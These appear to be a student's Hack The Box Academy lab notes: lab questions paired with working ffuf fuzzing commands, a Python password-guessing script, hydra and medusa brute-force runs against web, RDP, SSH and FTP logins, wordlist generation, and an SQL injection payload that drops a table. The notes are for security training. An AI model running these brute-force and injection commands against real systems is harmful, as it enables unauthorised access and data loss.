ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://94.237.51.160/FUZZ'

ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://94.237.51.160:39918/blog/FUZZ.php'

"Try running a sub-domain fuzzing test on 'inlanefreight.com' to find a customer sub-domain portal. What is the full domain of it?"
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u 'http://FUZZ.inlanefreight.com/'

ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'

"Try running a VHost fuzzing scan on 'academy.htb', and see what other VHosts you get. What other VHosts did you get?"
sudo sh -c 'echo "STMIP academy.htb" >> /etc/hosts'
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31420/ -H 'Host: FUZZ.academy.htb'
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31420/ -H 'Host: FUZZ.academy.htb' -fs 986
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31145/ -H 'Host: FUZZ.academy.htb' -ac

Using what you learned in this section, run a parameter fuzzing scan on this page. What is the parameter accepted by this webpage?
sudo sh -c 'echo "STMIP admin.academy.htb" >> /etc/hosts'
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:32354/admin/admin.php?FUZZ=key'
The response size of a request having an erroneous GET parameter is 798, thus, students need to filter it out using the -fs flag:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:32354/admin/admin.php?FUZZ=key' -fs 798

As we can see this time, we got a couple of hits, the same one we got when fuzzing GET and another parameter, which is id. Let's see what we get if we send a POST request with the id parameter. We can do that with curl, as follows:
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'

"Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?"
sudo sh -c 'echo "139.59.180.127 admin.academy.htb" >> /etc/hosts'
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
The response size for any erroneous request is 768, therefore, students need to filter it out using the -fs flag:
ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768
curl -s 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=73' | grep 'HTB'

-----------------
import requests

ip = "83.136.249.34"  # Change this to your instance IP address
port = 38768       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break

-----------------------
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
Next, we need to start matching that wordlist to the password policy.
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt


Brute-Forcing a Web Login Form
 hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
-----------------------------
Basic HTTP Authentication
------------------------------
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

After successfully brute-forcing, and then logging into the target, what is the full flag you find?
-----------------------------
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.52.235 -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

After successfully brute-forcing, and then logging into the target, what is the full flag you find?
------------------------------
Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.
------------------------------
 What was the password for the ftpuser?
 sudo apt install medusa
 wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
 medusa -h 83.136.255.143 -n 34377 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
ssh sshuser@STMIP -p STMPO
nmap localhost
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
ftp ftp://ftpuser:qqww1122@localhost
-------------------
 sudo apt install ruby -y
 git clone https://github.com/urbanadventurer/username-anarchy.git
 cd username-anarchy
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
 -
 sudo apt install cupp -y
  cupp -i
   grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
   hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 After successfully brute-forcing, and then logging into the target, what is the full flag you find?
 -----------------------
 sudo apt install cupp -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > ../jane_smith_usernames.txt
cupp -i
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.53.113 -s 33384 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
-======================================
"Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?"
mysql -h 46.101.61.42 -P 30658 -u root -ppassword
SHOW databases;
-------------
"What is the department number for the 'Development' department?"
mysql -h 46.101.61.42 -P 30658 -u root -ppassword
USE employees;
SHOW TABLES;
DESCRIBE departments;
SELECT dept_no FROM departments WHERE dept_name="Development";  SELECT * FROM departments;
---------------------
"What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?"
USE employees; 
DESCRIBE employees;
SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
--------------------
"In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?"
USE employees;
DESCRIBE titles;
SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
------------
1'; DROP TABLE
select * from logins where username like '%1'; DROP TABLE users;'
Error: near line 1: near "'": syntax error
select * from logins where username like '%1'; DROP TABLE users;'